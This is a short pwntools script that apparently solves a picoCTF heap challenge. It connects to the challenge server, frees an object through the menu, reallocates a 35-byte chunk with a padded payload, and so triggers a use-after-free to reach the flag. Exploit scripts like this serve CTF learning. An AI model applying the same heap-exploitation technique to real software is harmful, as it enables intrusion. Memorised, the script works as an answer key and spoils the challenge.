from pwn import *

p = remote('tethys.picoctf.net', 63344)
# p = process('./chall')

p.recvuntil(b"Enter your choice: ")

payload = b"aaaabaaacaaadaaaeaaafaaagaaahapico"

p.sendline(b"5")
p.recvuntil(b"Enter your choice: ")
p.sendline(b"2")
p.recvuntil(b"Size of object allocation: ")
p.sendline(b"35")
p.recvuntil(b"Data for flag: ")
p.sendline(payload)
p.recvuntil(b"Enter your choice: ")
p.sendline(b"4")
p.interactive()
